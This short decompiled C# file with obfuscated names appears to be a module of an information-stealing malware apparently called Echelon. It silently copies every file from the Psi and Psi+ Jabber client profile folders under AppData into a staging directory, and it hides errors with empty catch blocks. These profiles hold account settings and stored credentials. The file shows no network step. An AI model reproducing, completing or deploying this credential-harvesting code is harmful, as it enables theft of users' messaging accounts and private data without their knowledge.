using Echelon;
using System.IO;

internal class ah
{
	public static void a(string @in)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Global.AppDate + "\\Psi+\\profiles\\default\\").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(@in + "\\Jabber\\Psi+\\profiles\\default\\");
				fileInfo.CopyTo(@in + "\\Jabber\\Psi+\\profiles\\default\\" + fileInfo.Name);
			}
			ai.a++;
		}
		catch
		{
		}
		try
		{
			FileInfo[] files = new DirectoryInfo(Global.AppDate + "\\Psi\\profiles\\default\\").GetFiles();
			foreach (FileInfo fileInfo2 in files)
			{
				Directory.CreateDirectory(@in + "\\Jabber\\Psi\\profiles\\default\\");
				fileInfo2.CopyTo(@in + "\\Jabber\\Psi\\profiles\\default\\" + fileInfo2.Name);
			}
			ai.a++;
		}
		catch
		{
		}
	}
}
